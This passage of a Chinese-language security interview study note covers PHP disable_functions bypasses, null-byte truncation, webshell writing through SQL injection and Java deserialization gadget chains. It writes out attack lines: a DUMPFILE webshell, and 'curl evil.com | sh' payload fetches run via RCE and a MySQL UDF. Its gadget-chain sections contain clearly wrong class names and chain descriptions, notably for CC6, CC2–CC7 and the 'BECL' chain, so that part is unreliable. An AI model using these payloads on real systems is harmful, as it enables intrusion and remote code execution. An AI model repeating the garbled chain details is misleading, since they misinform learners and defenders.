<p><strong>漏洞名称：</strong> CVE-2016-3714 (ImageTragick) <strong>原理：</strong> ImageMagick 是一个用于创建、编辑和转换图像的流行开源软件。该漏洞允许攻击者通过处理一个特制的图像文件（例如 SVG、MVG 格式）来执行任意系统命令</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>制作一个恶意的 SVG 或 MVG 格式图像文件，其中嵌入了命令执行 Payload。例如：<code>&quot;push graphic-context viewbox 0 0 640 480 fill &#39;url(https://example.com/)&#39;&quot;</code>，<code>url()</code> 后面可以接 <code>file://</code> 或 <code>http://</code> 等协议，通过 <code>pipe</code> 触发命令</li>
<li>在 PHP 中，如果使用了 <strong><code>Imagick</code></strong> 扩展来处理上传的图像文件，当调用 <code>readImage()</code> 或 <code>pingImage()</code> 等函数时，就会触发漏洞，执行恶意 Payload</li>
</ol>
<p>这种方法主要针对使用了特定软件版本且存在漏洞的目标，属于典型的“Nday”漏洞利用</p>
<p><strong>3. Windows 系统组件 COM 绕过</strong></p>
<p><strong>原理：</strong> 在 Windows 环境下，<strong><code>COM</code></strong> (Component Object Model) 是一个重要的技术。PHP 的 <code>COM</code> 扩展可以用来创建和调用 COM 组件。其中，<code>WScript.Shell</code> 这个组件可以用来执行系统命令</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>在 PHP 代码中，通过 <code>new COM(&#39;WScript.shell&#39;)</code> 创建一个 <code>WScript.Shell</code> 对象</li>
<li>调用这个对象的 <code>run()</code> 或 <code>exec()</code> 方法来执行命令。例如：<code>$shell = new COM(&#39;WScript.shell&#39;); $shell-&gt;Run(&#39;cmd.exe /c &quot;whoami&quot;&#39;);</code></li>
<li>这种方法依赖于 PHP 的 <code>COM</code> 扩展是否启用，以及目标服务器是否是 Windows 系统</li>
</ol>
<p><strong>4. PHP 7.4 FFI 绕过</strong></p>
<p><strong>原理：</strong> <strong><code>FFI</code></strong> (Foreign Function Interface) 是 PHP 7.4 引入的一个扩展，允许 PHP 代码直接调用 C 语言的函数和数据结构，而无需编写额外的 C 语言扩展。这大大增强了 PHP 的能力，同时也带来了安全风险</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>使用 <code>FFI::cdef()</code> 函数加载 <code>libc</code> 库，并定义 <code>system</code> 或 <code>exec</code> 函数</li>
<li>然后就可以像调用 PHP 函数一样调用 C 语言的 <code>system</code> 函数来执行命令</li>
<li>例如：<code>$ffi = FFI::cdef(&#39;int system(const char *command);&#39;, &#39;libc.so.6&#39;); $ffi-&gt;system(&#39;whoami&#39;);</code></li>
<li>这种方法非常强大，但前提是 <code>FFI</code> 扩展已启用且未被禁用</li>
</ol>
<p><strong>5. Bash 破壳漏洞</strong></p>
<p><strong>漏洞名称：</strong> CVE-2014-6271 (Shellshock) <strong>原理：</strong> 这是一个在 Bash 4.3 及更早版本中的高危漏洞。它允许攻击者通过环境变量，向 Bash 注入并执行任意代码</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>在 PHP 中，使用 <code>putenv()</code> 设置一个特殊的恶意环境变量</li>
<li>例如：<code>putenv(&quot;test=() &#123; :;&#125;; echo &#39;VULNERABLE&#39;&quot;);</code></li>
<li>随后，调用任何可以调用 Bash 的函数，例如 <code>mail()</code> 或 <code>exec()</code>。当 Bash 被调用时，它会解析环境变量，触发漏洞，执行恶意 Payload</li>
</ol>
<p><strong>6. <code>imap_open()</code> 绕过</strong></p>
<p><strong>漏洞名称：</strong> CVE-2018-19518 <strong>原理：</strong> 在 PHP 5.x 和 7.x 版本中，<code>imap_open()</code> 函数存在一个漏洞。当处理一个特定的 IMAP 协议 URL 时，它会调用 <code>rsh</code> 或 <code>ssh</code> 命令来连接远程服务器，从而导致命令执行</p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li>在 PHP 中调用 <code>imap_open()</code> 函数，并传入一个恶意构造的 IMAP URL</li>
<li>例如：<code>imap_open(&#39;-oProxyCommand=whoami&#39;, &#39;a&#39;, &#39;a&#39;);</code></li>
<li><code>-oProxyCommand</code> 是一个 SSH 选项，它允许在连接前执行命令。<code>imap_open()</code> 会调用 <code>rsh</code> 或 <code>ssh</code>，从而触发这个命令执行</li>
<li>这种方法依赖于目标服务器上 <code>imap</code> 扩展是否启用</li>
</ol>
<p><strong>7. <code>pcntl</code> 插件绕过</strong></p>
<p><strong>原理：</strong> <strong><code>pcntl</code></strong> 是 PHP 的一个进程控制扩展，它提供了一系列与进程相关的函数，例如 <code>pcntl_exec()</code></p>
<p><strong>绕过步骤：</strong></p>
<ol>
<li><code>pcntl_exec()</code> 函数可以用来在当前进程中执行一个指定的程序</li>
<li>例如：<code>pcntl_exec(&#39;/bin/sh&#39;, array(&#39;-c&#39;, &#39;whoami&#39;));</code></li>
<li><code>pcntl_exec()</code> 会直接替换当前 PHP 进程，而不会像 <code>system()</code> 那样创建一个新的子进程。这种方法非常隐蔽，且通常不被 <code>disable_functions</code> 列表所限制</li>
</ol>
<hr>
<h3 id="PHP-的-00-截断的原理"><a href="#PHP-的-00-截断的原理" class="headerlink" title="PHP 的 %00 截断的原理"></a>PHP 的 %00 截断的原理</h3><p>当 PHP 脚本在调用某些文件操作函数（如 <code>include()</code>、<code>require()</code>、<code>file_get_contents()</code> 等）时，底层会调用 C 语言的库函数。在 C 语言中，字符串是以**空字节（null byte）**作为结束符的，即十六进制的 <code>0x00</code>。当 C 语言函数读取到 <code>0x00</code> 时，就会认为字符串已经结束</p>
<p>而 PHP 脚本在处理用户输入时，并不会像 C 语言那样将 <code>%00</code> 解析为空字节，它会将其当作普通的字符串。但是，当这个字符串被传入底层 C 语言函数进行文件操作时，C 语言会截断这个字符串，只处理 <code>%00</code> 之前的部分</p>
<p>假设服务器上有一个 PHP 脚本，其代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&quot;.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码的本意是让用户通过 <code>file</code> 参数指定一个文件名，然后脚本会在文件名后面自动加上 <code>.php</code> 后缀，再包含这个文件</p>
<p>现在，如果攻击者想要利用这个漏洞来包含一个图片文件 <code>shell.jpg</code>（其中包含恶意 PHP 代码），他可以构造一个带有 <code>%00</code> 截断的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=shell.jpg%00</span><br></pre></td></tr></table></figure>

<p>当 PHP 脚本接收到这个 URL 时：</p>
<ol>
<li><strong>PHP 层</strong>：<ul>
<li><code>$file</code> 的值是 <code>shell.jpg%00</code></li>
<li><code>$file . &quot;.php&quot;</code> 拼接后的字符串是 <code>shell.jpg%00.php</code></li>
</ul>
</li>
<li><strong>C 语言底层</strong>：<ul>
<li>当 <code>include()</code> 函数将 <code>shell.jpg%00.php</code> 这个字符串传递给底层的 C 语言文件操作函数时，C 语言会把 <code>%00</code> 识别为空字节（<code>\0</code>）</li>
<li>根据 C 语言的字符串处理规则，它会认为字符串在 <code>shell.jpg</code> 处就已经结束了</li>
<li>最终，操作系统实际打开的文件名是 <code>shell.jpg</code>，而不是 <code>shell.jpg.php</code></li>
</ul>
</li>
</ol>
<p>这样一来，攻击者就成功绕过了 <code>.php</code> 后缀的限制，实现了对 <code>shell.jpg</code> 的文件包含，从而执行了图片中的恶意代码</p>
<hr>
<h3 id="站库分离怎么拿-Shell"><a href="#站库分离怎么拿-Shell" class="headerlink" title="站库分离怎么拿 Shell"></a>站库分离怎么拿 Shell</h3><p><strong>1. SQL 注入结合文件上传或文件写入漏洞</strong></p>
<p>即使无法直接写入 <code>webshell</code>，SQL 注入仍然可以用于读取或修改数据库中的数据。如果应用程序存在<strong>文件上传漏洞</strong>，攻击者可以利用 SQL 注入漏洞修改数据库中的某些配置，例如文件上传路径、文件后缀白名单等</p>
<p><strong>渗透思路：</strong></p>
<ul>
<li>利用SQL注入读取网站的配置文件，获取文件上传路径</li>
<li>利用SQL注入修改数据库中的上传路径或白名单，使其允许上传恶意文件类型（如 <code>.php</code>）</li>
<li>结合文件上传漏洞，上传精心构造的 <code>webshell</code></li>
</ul>
<p><strong>2. 利用数据库的写权限进行命令执行</strong></p>
<p>在某些非严格配置的环境中，数据库用户可能拥有写入文件系统的权限。攻击者可以尝试通过数据库的 <code>LOAD_FILE()</code>、<code>SELECT ... INTO DUMPFILE</code> 等函数，将恶意代码写入到 Web 服务器的可写目录中</p>
<p><strong>渗透思路：</strong></p>
<ul>
<li><strong>读取配置文件</strong>: 利用 SQL 注入读取 Web 服务器上的 <code>phpinfo</code> 或网站配置文件，寻找可写的目录路径</li>
<li><strong>写入<code>webshell</code></strong>: 尝试使用<code>SELECT &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; INTO DUMPFILE &#39;/var/www/html/upload/shell.php&#39;</code> 将 <code>webshell</code> 代码写入到Web服务器的 <code>upload</code> 目录</li>
<li><strong>注意</strong>: 这种方法需要数据库用户具有 <code>file_priv</code> 权限，并且数据库的<code>secure_file_priv</code>参数没有限制。在站库分离架构下，这种配置是<strong>不推荐</strong>的，但仍有可能存在</li>
</ul>
<p><strong>3. 利用 Web 服务器自身的漏洞</strong></p>
<p>这是最直接有效的方法。在站库分离架构中，数据库服务器通常难以直接入侵，但 Web 服务器本身可能存在**远程命令执行（RCE）<strong>或</strong>文件包含（LFI&#x2F;RFI）**等高危漏洞</p>
<p><strong>渗透思路：</strong></p>
<ul>
<li><strong>远程命令执行（RCE）</strong>: 如果 Web 服务器存在 RCE 漏洞，攻击者可以直接执行系统命令，例如<code>curl http://evil.com/shell.txt | sh</code>，下载并执行恶意脚本，从而获取反弹<code>shell</code>或写入<code>webshell</code></li>
<li><strong>文件包含（LFI&#x2F;RFI）</strong>: 利用 LFI&#x2F;RFI 漏洞，可以读取敏感文件或包含远程服务器上的恶意文件。例如，攻击者可以利用 <code>file_get_contents(&#39;http://evil.com/shell.txt&#39;)</code> 将远程 <code>webshell</code> 文件包含到 Web 服务器，从而执行恶意代码</li>
</ul>
<p><strong>4. 通过数据库的 UDF 函数提权</strong></p>
<p>如果攻击者在数据库上拥有足够高的权限（例如<code>root</code>），并且数据库服务器允许动态加载库文件，他们可以上传自定义的**UDF（用户自定义函数）**库文件，并在数据库服务器上执行系统命令</p>
<p><strong>渗透思路：</strong></p>
<ul>
<li><strong>SQL注入提权</strong>: 利用 SQL 注入获取数据库 <code>root</code> 权限</li>
<li><strong>上传UDF文件</strong>: 通过 <code>load_file()</code> 或 <code>into dumpfile</code> 等方法，将恶意 UDF 库文件（例如<code>lib_mysqludf_sys.so</code>）上传到数据库服务器的插件目录</li>
<li><strong>创建自定义函数</strong>: 在数据库中创建新的函数，例如 <code>sys_eval()</code>，该函数能够执行系统命令</li>
<li><strong>执行命令</strong>: 调用 <code>sys_eval()</code> 函数，执行系统命令，例如 <code>select sys_eval(&#39;curl http://evil.com/shell.txt | sh&#39;)</code></li>
<li><strong>注意</strong>: 这种方法主要用于在数据库服务器上获取 <code>shell</code>，而不是在 Web 服务器上。但如果数据库服务器配置不当，可能通过 UDF 执行的命令来反向攻击 Web 服务器</li>
</ul>
<h1 id="15-反序列化漏洞"><a href="#15-反序列化漏洞" class="headerlink" title="15- 反序列化漏洞"></a>15- 反序列化漏洞</h1><h3 id="CC1、CC6-区别"><a href="#CC1、CC6-区别" class="headerlink" title="CC1、CC6 区别"></a>CC1、CC6 区别</h3><p><strong>Commons Collections 1 (CC1) 利用链</strong></p>
<p>CC1 是最经典、最广为人知的 Commons Collections 反序列化利用链。它利用了 <code>InvokerTransformer</code> 这个转换器来反射调用任意方法</p>
<p><strong>利用链核心原理</strong></p>
<p>CC1 利用链的核心思想是通过调用链，最终在反序列化过程中触发 <code>TemplatesImpl</code> 类的 <code>newTransformer</code> 方法，从而执行任意命令</p>
<ol>
<li><strong><code>InvokerTransformer</code></strong>：这是核心组件。它的 <code>transform()</code> 方法能够通过反射调用任意对象的任意方法。攻击者可以利用它来调用 <code>Runtime.getRuntime().exec()</code></li>
<li><strong><code>InstantiateTransformer</code></strong>：这个转换器用于实例化一个对象，其 <code>transform()</code> 方法会调用构造函数。在利用链中，它常用来实例化 <code>InvokerTransformer</code> 对象</li>
<li><strong><code>LazyMap</code></strong>：这是一个延迟加载的 Map，它的 <code>get()</code> 方法会在键不存在时调用一个预设的转换器（Transformer）。攻击者可以将 <code>InvokerTransformer</code> 作为这个转换器，当对一个不存在的键进行 <code>get()</code> 操作时，就会触发 <code>InvokerTransformer</code> 的 <code>transform()</code> 方法</li>
<li><strong><code>AnnotationInvocationHandler</code></strong> 或 <strong><code>BadAttributeValueExpException</code></strong>：CC1 利用链通常需要一个入口点，来触发 <code>LazyMap</code> 的 <code>get()</code> 方法。在旧版本的 JDK 中，<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 方法会在反序列化时自动调用其内部的 <code>Proxy</code> 对象的 <code>invoke()</code> 方法，从而间接触发 <code>LazyMap</code> 的 <code>get()</code>。对于新版本的 JDK，由于对 <code>AnnotationInvocationHandler</code> 进行了限制，攻击者转而利用 <code>BadAttributeValueExpException</code> 的 <code>readObject()</code> 方法</li>
</ol>
<p><strong>Commons Collections 6 (CC6) 利用链</strong></p>
<p>CC6 旨在解决 CC1 在较新版本的库和 JDK 中失效的问题。它抛弃了 CC1 中常用的 <code>InvokerTransformer</code>，转而利用 <code>TiedMapEntry</code> 和 <code>LinkedSet</code> 等新的类来构造利用链</p>
<p><strong>利用链核心原理</strong></p>
<p>CC6 的核心思想是利用 <code>TiedMapEntry</code> 在反序列化时触发 <code>Map</code> 的 <code>get()</code> 方法，最终同样达到命令执行的目的</p>
<ol>
<li><strong><code>TiedMapEntry</code></strong>：这是 CC6 利用链的核心。它的 <code>toString()</code> 方法在调用时会触发其内部 <code>Map</code> 的 <code>get()</code> 方法</li>
<li><strong><code>AbstractMap$TansformMapDecorator</code></strong>：这是一个装饰器，它装饰了一个 Map，并用一个 <code>Transformer</code> 来处理其键值</li>
<li><strong><code>TransformedMap</code></strong>：当向这个 Map 添加元素时，其 <code>put()</code> 方法会调用一个预设的 <code>Transformer</code></li>
<li><strong><code>LinkedSet</code></strong>：在 CC6 的利用中，攻击者通常会利用 <code>LinkedSet</code> 的 <code>equals()</code> 方法，该方法会遍历集合中的元素并调用它们的 <code>equals()</code>。通过精心构造 <code>LinkedSet</code>，可以使其内部的 <code>TiedMapEntry</code> 实例的 <code>toString()</code> 方法被调用</li>
<li><strong><code>InvokerTransformer</code> (再次出现)</strong>：尽管 CC6 旨在避开 <code>InvokerTransformer</code>，但在某些变体中，它仍然可以作为最终的命令执行器。不同的是，CC6 利用链的触发点不再是 CC1 中的 <code>LazyMap</code></li>
</ol>
<table>
<thead>
<tr>
<th>特性</th>
<th>Commons Collections 1 (CC1)</th>
<th>Commons Collections 6 (CC6)</th>
</tr>
</thead>
<tbody><tr>
<td>核心触发器</td>
<td>LazyMap 的 get() 方法</td>
<td>TiedMapEntry 的 toString() 方法</td>
</tr>
<tr>
<td>主要攻击类</td>
<td>InvokerTransformer, LazyMap, AnnotationInvocationHandler</td>
<td>TiedMapEntry, LinkedSet, TransformedMap</td>
</tr>
<tr>
<td>核心思想</td>
<td>通过 LazyMap 间接调用 InvokerTransformer</td>
<td>通过 TiedMapEntry 的 toString() 调用 Map 的 get()</td>
</tr>
<tr>
<td>适用范围</td>
<td>较老的 Commons Collections 库版本，以及旧版 JDK</td>
<td>较新的 Commons Collections 库版本，解决了 CC1 在新版本中的问题</td>
</tr>
<tr>
<td>链条复杂性</td>
<td>相对简单，逻辑直接</td>
<td>相对复杂，涉及更多的类和间接调用</td>
</tr>
</tbody></table>
<hr>
<h3 id="讲讲-IIOP-和-T3-反序列化原理"><a href="#讲讲-IIOP-和-T3-反序列化原理" class="headerlink" title="讲讲 IIOP 和 T3 反序列化原理"></a>讲讲 IIOP 和 T3 反序列化原理</h3><p><strong>1. IIOP (Internet Inter-Orb Protocol) 原理</strong></p>
<p><strong>IIOP</strong> 是 <strong>OMG CORBA</strong>（Common Object Request Broker Architecture）规范的一部分，用于在不同平台、不同编程语言之间实现分布式对象的通信。Java 的 RMI-IIOP 是一个实现，它允许 RMI 对象通过 IIOP 协议进行通信。</p>
<p><strong>IIOP 工作原理</strong></p>
<p>IIOP 的核心是一个**通用的远程过程调用（RPC）**协议，它的目标是让远程对象调用看起来像本地调用一样简单</p>
<ol>
<li><strong>对象序列化</strong>：当客户端调用远程对象的方法时，方法名和参数会被序列化成二进制数据</li>
<li><strong>网络传输</strong>：这些数据通过 TCP&#x2F;IP 传输到服务器</li>
<li><strong>对象反序列化</strong>：服务器接收到数据后，会将其反序列化成 Java 对象，并在远程对象上执行相应的方法</li>
</ol>
<p>这个过程依赖于<strong>通用互操作性</strong>。IIOP 协议本身不限制传输的数据类型，任何实现了 <code>java.io.Serializable</code> 接口的对象都可以通过 IIOP 传输</p>
<p><strong>IIOP 反序列化漏洞原理</strong></p>
<p>IIOP 反序列化漏洞的原理与<strong>RMI 反序列化</strong>非常相似，因为它也基于 Java 的序列化机制</p>
<ul>
<li><strong>漏洞触发点</strong>：IIOP 服务器（如 WebLogic）在处理客户端发送的请求时，会<strong>自动对请求体中的对象进行反序列化</strong></li>
<li><strong>攻击链</strong>：攻击者可以构造一个恶意的 IIOP 请求，其请求体中包含一个恶意的序列化对象，这个对象中嵌入了 Gadget Chain（如 <code>Apache Commons Collections</code>、<code>ysoserial</code> 生成的 Payload）</li>
<li><strong>远程代码执行（RCE）</strong>：当服务器反序列化这个恶意对象时，就会触发 Gadget Chain，最终执行系统命令，从而实现 RCE</li>
</ul>
<p><strong>2. T3 反序列化原理</strong></p>
<p><strong>T3</strong> 是 <strong>Oracle WebLogic Server</strong> 独有的一个网络协议。它是 WebLogic 专用的、基于 TCP&#x2F;IP 的二进制协议，用于 WebLogic 服务器、客户端、集群之间的通信。T3 协议在 WebLogic 的 RMI 实现中被广泛使用，其设计目标是为了优化性能和集群通信</p>
<p><strong>T3 工作原理</strong></p>
<p>T3 协议的本质是<strong>在 Java 序列化之上，增加了自己的消息头和协议规范</strong>。它定义了一系列消息类型，如<code>HELLO</code>、<code>CLUSTER</code>、<code>AUTHENTICATE</code> 等。每个消息体都是一个 Java 序列化对象</p>
<ul>
<li><strong>T3 消息头</strong>：T3 协议有自己的消息头，包含版本信息、长度等</li>
<li><strong>Java 序列化对象</strong>：消息头之后是 Java 序列化的对象数据</li>
</ul>
<p><strong>T3 反序列化漏洞原理</strong></p>
<p>T3 反序列化漏洞是 WebLogic RCE 漏洞的经典类型，其原理与 IIOP 类似，但更具针对性</p>
<ul>
<li><strong>漏洞触发点</strong>：攻击者发现 WebLogic T3 协议在处理某些特定消息时，<strong>没有对传入的 Java 序列化对象进行严格的验证和过滤</strong>。特别是当客户端发起一个合法的 T3 请求（如 <code>HELLO</code> 消息）后，服务端会接受一个后续的序列化对象</li>
<li><strong>攻击链</strong>：攻击者可以向 WebLogic 的 T3 端口（通常是 7001）发送一个恶意的 T3 消息。这个消息体中，包含一个精心构造的序列化对象（如 <code>ysoserial</code> 生成的 Payload）</li>
<li><strong>远程代码执行（RCE）</strong>：当 WebLogic 服务器反序列化这个对象时，就会触发恶意代码，例如利用 <code>CommonsCollections</code>、<code>Spring</code> 或其他依赖库中的 Gadget Chain，从而在服务器上执行命令</li>
</ul>
<table>
<thead>
<tr>
<th>对比项</th>
<th>IIOP 反序列化</th>
<th>T3 反序列化</th>
</tr>
</thead>
<tbody><tr>
<td>协议类型</td>
<td>标准协议（CORBA 规范）</td>
<td>WebLogic 专用协议</td>
</tr>
<tr>
<td>触发端口</td>
<td>通常是 WebLogic 的 IIOP 端口（如 7002）</td>
<td>WebLogic 的 T3 端口（如 7001）</td>
</tr>
<tr>
<td>漏洞本质</td>
<td>Java 反序列化</td>
<td>Java 反序列化</td>
</tr>
<tr>
<td>利用方式</td>
<td>构造恶意的 IIOP 请求，包含序列化 Payload</td>
<td>构造恶意的 T3 消息，包含序列化 Payload</td>
</tr>
<tr>
<td>影响范围</td>
<td>所有使用 IIOP 的应用服务器</td>
<td>主要是 Oracle WebLogic Server</td>
</tr>
</tbody></table>
<hr>
<h3 id="Java-invoke-反射具体利用"><a href="#Java-invoke-反射具体利用" class="headerlink" title="Java invoke 反射具体利用"></a>Java invoke 反射具体利用</h3><p><strong>1. <code>invoke</code> 反射的基础</strong></p>
<p><code>java.lang.reflect.Method</code> 类的 <code>invoke()</code> 方法是反射的核心。它的签名如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure>

<ul>
<li><code>obj</code>：要调用方法的对象实例。如果是静态方法，<code>obj</code> 可以为 <code>null</code></li>
<li><code>args</code>：调用方法时传入的参数</li>
</ul>
<p><strong>利用方式</strong>：通过 <code>invoke</code>，你可以在不知道类名、方法名和参数类型的情况下，动态地调用任何方法。这正是它成为漏洞利用利器的原因</p>
<p><strong>2. <code>invoke</code> 反射在反序列化中的利用</strong></p>
<p>在 Java 反序列化漏洞中，<code>invoke</code> 反射通常用于构建 <strong>Gadget Chain</strong>，实现远程代码执行（RCE）</p>
<p><strong>场景</strong>：<code>Apache Commons Collections</code> 反序列化漏洞</p>
<ul>
<li><strong>核心 Gadget</strong>：<code>InvokerTransformer</code>。它的 <code>transform()</code> 方法正是利用了 <code>invoke</code> 反射</li>
<li><strong>攻击链</strong>：<ol>
<li>攻击者构造一个 <code>ChainedTransformer</code>，并将其与一系列 <code>Transformer</code> 组合</li>
<li>其中，最关键的 <code>Transformer</code> 就是 <code>InvokerTransformer</code>。攻击者会多次使用它来构建命令执行链</li>
<li><strong>第一次 <code>invoke</code></strong>：<ul>
<li><code>Transformer</code> 实例：<code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;)</code></li>
<li>攻击者传入 <code>java.lang.Runtime</code> 类作为 <code>obj</code>，<code>invoke</code> 方法会调用 <code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;)</code></li>
<li>这会返回一个 <code>Method</code> 对象，指向 <code>getRuntime()</code> 方法</li>
</ul>
</li>
<li><strong>第二次 <code>invoke</code></strong>：<ul>
<li><code>Transformer</code> 实例：<code>new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)</code></li>
<li>攻击者传入上一步返回的 <code>Method</code> 对象作为 <code>obj</code>，<code>invoke</code> 方法会调用 <code>getRuntime().invoke(null, null)</code></li>
<li>这会返回一个 <code>Runtime</code> 实例</li>
</ul>
</li>
<li><strong>第三次 <code>invoke</code></strong>：<ul>
<li><code>Transformer</code> 实例：<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;whoami&quot;&#125;)</code></li>
<li>攻击者传入上一步返回的 <code>Runtime</code> 实例作为 <code>obj</code>，<code>invoke</code> 方法会调用 <code>runtime.exec(&quot;whoami&quot;)</code></li>
</ul>
</li>
</ol>
</li>
<li><strong>最终结果</strong>：通过三次 <code>invoke</code> 反射的串联，实现了从获取 <code>Runtime</code> 实例到执行系统命令的完整攻击过程</li>
</ul>
<p><strong>3. <code>invoke</code> 反射在表达式注入中的利用</strong></p>
<p>在表达式语言（如 SpEL、OGNL）注入漏洞中，<code>invoke</code> 反射是实现 RCE 的主要手段</p>
<p><strong>场景</strong>：Spring SpEL 注入</p>
<ul>
<li><strong>攻击 Payload</strong>：<code>T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)</code></li>
<li><strong>攻击链</strong>：当 Spring 解析这个表达式时，它会执行以下步骤：<ol>
<li><strong><code>T()</code></strong>：表达式引擎通过反射找到并获取 <code>java.lang.Runtime</code> 类对象</li>
<li><strong><code>getRuntime()</code></strong>：表达式引擎调用 <code>java.lang.Runtime</code> 类的<strong>静态方法</strong> <code>getRuntime()</code>。这个过程在底层也是通过 <code>invoke</code> 反射实现的，传入 <code>null</code> 作为对象实例</li>
<li><strong><code>exec()</code></strong>：表达式引擎调用上一步返回的 <code>Runtime</code> 实例的 <code>exec(&quot;whoami&quot;)</code> 方法</li>
</ol>
</li>
<li><strong>最终结果</strong>：成功执行系统命令</li>
</ul>
<hr>
<h3 id="讲一下-CC1-7-的原理"><a href="#讲一下-CC1-7-的原理" class="headerlink" title="讲一下 CC1-7 的原理"></a>讲一下 CC1-7 的原理</h3><p><strong>CC1: <code>InvokerTransformer</code></strong></p>
<ul>
<li><strong>原理</strong>：这是最经典、最著名的利用链。它利用了 <code>InvokerTransformer</code> 这个类，它的 <code>transform</code> 方法可以通过反射调用任何对象的任何方法</li>
<li><strong>攻击链</strong>：<ol>
<li><strong><code>LazyMap</code></strong>：它是一个惰性加载的 Map，当访问一个不存在的键时，会调用一个 <code>Transformer</code> 来生成值</li>
<li><strong><code>InvokerTransformer</code></strong>：攻击者将 <code>InvokerTransformer</code> 封装到 <code>LazyMap</code> 中，并指定其调用 <code>Runtime.getRuntime().exec()</code> 方法</li>
<li><strong><code>AnnotationInvocationHandler</code></strong>：当 <code>LazyMap</code> 被反序列化时，<code>AnnotationInvocationHandler</code> 会调用它的 <code>invoke</code> 方法，从而触发 <code>LazyMap</code> 的 <code>get</code> 方法</li>
<li><strong><code>Runtime.exec()</code></strong>：最终，<code>LazyMap</code> 的 <code>get</code> 方法会调用 <code>InvokerTransformer</code>，通过反射执行 <code>Runtime.exec()</code>，从而执行任意命令</li>
</ol>
</li>
<li><strong>绕过</strong>：由于 <code>InvokerTransformer</code> 过于危险，它很快被许多安全框架和应用服务器加入了反序列化黑名单</li>
</ul>
<p><strong>CC2-CC7：黑名单绕过与新 Gadget Chain 的发现</strong></p>
<p>在 CC1 被加入黑名单后，研究人员开始寻找新的、没有被列入黑名单的 Gadget Chain。这些新的利用链都遵循同样的原理，只是<strong>利用了不同的类来构建多米诺骨牌</strong></p>
<ul>
<li><strong>CC2 (<code>j_object</code>)</strong>：利用 <code>Spring</code> 框架中的 <code>Javassist</code> 类库。它通过 <code>ClassPathXmlApplicationContext</code> 加载一个远程 XML 文件，从而执行远程代码</li>
<li><strong>CC3 (<code>j_object</code>)</strong>：利用 <code>AbstractMap</code> 的 <code>hashCode</code> 方法，通过 <code>equals</code> 方法来触发 <code>InvokerTransformer</code></li>
<li><strong>CC4 (<code>j_object</code>)</strong>：利用 <code>Spring</code> 的 <code>BadAttributeValueExpException</code> 类。当这个类被反序列化时，它的 <code>toString</code> 方法会被调用，从而触发 <code>InvokerTransformer</code></li>
<li><strong>CC5 (<code>j_object</code>)</strong>：这个利用链与 CC1 类似，但它通过 <code>TiedMapEntry</code> 来触发 <code>LazyMap</code>，从而绕过了一些针对 <code>AnnotationInvocationHandler</code> 的防御</li>
<li><strong>CC6 (<code>j_object</code>)</strong>：这个利用链也使用了 <code>TiedMapEntry</code>，但它通过 <code>TiedMapEntry</code> 的 <code>toString</code> 方法来触发 <code>LazyMap</code></li>
<li><strong>CC7 (<code>j_object</code>)</strong>：这个利用链使用 <code>HashedMap</code> 的 <code>readObject</code> 方法来触发 <code>AbstractMap</code> 的 <code>put</code> 方法，最终触发 <code>InvokerTransformer</code></li>
</ul>
<hr>
<h3 id="BECL-利用链使用条件及原理"><a href="#BECL-利用链使用条件及原理" class="headerlink" title="BECL 利用链使用条件及原理"></a>BECL 利用链使用条件及原理</h3><p><strong>1. BECL 利用链核心原理</strong></p>
<p>BECL 利用链的核心原理可以概括为：<strong>利用一个看似无害的内部类，间接调用受限的命令执行函数</strong></p>
<p>它主要利用了 <code>com.bea.core.event.JmsEvent</code> 类及其相关类的反序列化过程。当一个 <code>JmsEvent</code> 对象被反序列化时，它会触发一系列的事件监听器，其中一个监听器会调用 <code>execute()</code> 方法来执行一个命令</p>
<p>BECL 的攻击链通常如下：</p>
<ol>
<li><strong>构造恶意对象：</strong> 攻击者首先构造一个恶意的 Java 对象，该对象包含一个指向目标命令执行函数的引用。这个对象通常会利用 Java 的<strong>反射机制</strong>，指向 <code>java.lang.Runtime</code> 类的 <code>exec()</code> 方法</li>
<li><strong>触发点：<code>com.bea.core.events.JmsEvent</code></strong>： 攻击者将上述恶意对象封装在一个 <code>JmsEvent</code> 对象中。当这个 <code>JmsEvent</code> 对象被反序列化时，它会触发 <code>readObject()</code> 方法</li>
<li><strong>事件监听：<code>com.bea.core.events.SerializableEventListener</code></strong>： <code>JmsEvent</code> 的反序列化会调用 <code>com.bea.core.events.SerializableEventListener</code> 的 <code>handleEvent()</code> 方法</li>
<li><strong>命令执行：<code>java.lang.Runtime.exec()</code></strong>： <code>SerializableEventListener</code> 的 <code>handleEvent()</code> 方法会进一步调用攻击者预设的恶意对象，最终导致 <code>java.lang.Runtime.exec()</code> 方法被执行，从而在服务器上执行任意系统命令</li>
</ol>
<p><strong>简单来说，BECL 利用链就像一个接力赛：</strong></p>
<ul>
<li><strong>第一棒（攻击者）：</strong> 构造恶意序列化数据</li>
<li><strong>第二棒（<code>JmsEvent</code>）：</strong> 接收并开始反序列化</li>
